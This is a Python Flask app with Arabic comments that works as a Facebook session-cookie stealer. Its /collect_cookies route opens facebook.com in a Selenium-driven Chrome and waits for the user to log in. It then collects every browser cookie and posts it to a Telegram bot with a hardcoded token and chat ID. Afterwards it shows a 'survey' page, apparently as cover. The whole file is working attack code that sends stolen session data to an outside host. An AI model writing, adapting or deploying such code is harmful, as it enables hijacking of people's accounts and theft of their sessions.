
from flask import Flask, render_template

from selenium import webdriver
import time

import requests

app = Flask(__name__)

# إعداد Telegram Bot
TELEGRAM_BOT_TOKEN = '8156515209:AAEB4dtzn1oDz_Vh3SQrM0YDT8PMpVxvL78'  # استبدل بمعرف البوت الخاص بك
TELEGRAM_CHAT_ID = '2081090703'  # استبدل بمعرف الدردشة الخاص بك

# إرسال الكوكيز إلى التليجرام
def send_to_telegram(cookies):
    # تحويل الكوكيز إلى التنسيق المطلوب
    cookies_str = "; ".join([f"{name}={value}" for name, value in cookies.items()])
    message = f"الكوكيز:\n{cookies_str}"
    
    # إرسال الرسالة إلى التليجرام
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    params = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
    }
    requests.post(url, params=params)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/collect_cookies')
def collect_cookies():
    # إعداد المتصفح
    driver = webdriver.Chrome()  # تأكد من تثبيت ChromeDriver
    driver.get("https://www.facebook.com")

    # انتظر حتى يقوم المستخدم بتسجيل الدخول يدويًا
    time.sleep(20)  # انتظر 60 ثانية

    # جمع الكوكيز
    cookies = {cookie['name']: cookie['value'] for cookie in driver.get_cookies()}

    # إرسال الكوكيز إلى التليجرام
    send_to_telegram(cookies)

    # إبقاء المتصفح مفتوحًا

    return render_template('survey.html')

if __name__ == '__main__':
    app.run(debug=True)